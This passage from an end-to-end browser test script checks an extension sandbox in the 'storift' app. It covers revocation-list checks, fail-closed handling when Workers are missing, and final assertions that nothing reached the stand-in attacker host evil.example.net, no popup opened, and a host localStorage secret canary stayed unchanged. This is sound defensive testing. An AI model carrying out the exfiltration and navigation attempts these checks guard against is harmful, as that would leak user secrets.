			`${CARD('pomodoro-timer')} [role="switch"]`,
			{ timeout: 20_000 }
		);
		await page.locator(`${CARD('pomodoro-timer')} [role="switch"]`).click();
		await page.getByTestId('consent-confirm').click();
		await page.locator(`${CARD('pomodoro-timer')} .ui`).waitFor({ timeout: 20_000 });
		await bootCheck(
			'スクリプトを有効にしていて、1 日以上経っていれば、起動時に確認する',
			() => localStorage.removeItem('storift:extensions:revocation:last'),
			true
		);
		await bootCheck(
			'確認した直後(1 日以内)の起動では、確認しない',
			() => localStorage.setItem('storift:extensions:revocation:last', String(Date.now())),
			false
		);
		await bootCheck(
			'設定「失効リストを自動で確認」をオフにすると、確認しない',
			() => {
				localStorage.setItem('storift:extensions:revocation:auto', '0');
				localStorage.removeItem('storift:extensions:revocation:last');
			},
			false
		);
		await page.goto(`${base}/home`);
		await page.goto(`${base}/settings#extensions`);
		await page.getByTestId('revocation-off-note').waitFor({ timeout: 10_000 });
		check('オフにしたときの注意が表示される', true);
		await shot(page, 'phase3-revocation-setting-desktop-light');
		await page.evaluate(() => localStorage.removeItem('storift:extensions:revocation:auto'));

		console.log('[フェイルクローズ: ワーカーを起動できない環境では、スクリプトを実行しない]');
		const p2 = await context.newPage();
		await p2.addInitScript(() => {
			Object.defineProperty(window, 'Worker', { value: undefined, configurable: true });
		});
		await p2.goto(`${base}/settings#extensions`);
		await p2.getByTestId('ext-unsupported-pomodoro-timer').waitFor({ timeout: 30_000 });
		check('「この環境では実行できません」と表示される', true);
		check(
			'隔離環境(iframe)を作らず、スクリプトを実行していない',
			(await p2.locator('iframe[data-storift-sandbox]').count()) === 0
		);
		check(
			'スイッチは押せない',
			await p2.locator(`${CARD('pomodoro-timer')} [role="switch"]`).isDisabled()
		);
		await shot(p2, 'phase3-unsupported-desktop-light');
		await p2.close();

		console.log('[まとめ]');
		check(
			'evil.example.net へは最後まで 1 件も届いていない',
			requests.evil.length === 0,
			requests.evil.join(',')
		);
		check('ポップアップは最後まで開かなかった', popups.length === 0);
		check(
			'ホストのページは、攻撃で外部へ移動していない',
			!page.url().includes('evil') && !mainNavigations.some((u) => u.includes('evil')),
			mainNavigations.join(',')
		);
		check(
			'ホストの localStorage は変わっていない',
			(await page.evaluate(() => localStorage.getItem('storift:secret-canary'))) === 'host-secret'
		);
		check(
			'アプリ側のページエラーが最後まで出ていない',
			pageErrors.length === 0,
			pageErrors.join(' | ')
		);

		await shellHangScenario(base);
	} finally {
		await browser.close();
		vite.stop();
	}
	finish();
}

main().catch((error) => {
	console.error(error);
	process.exit(1);
});
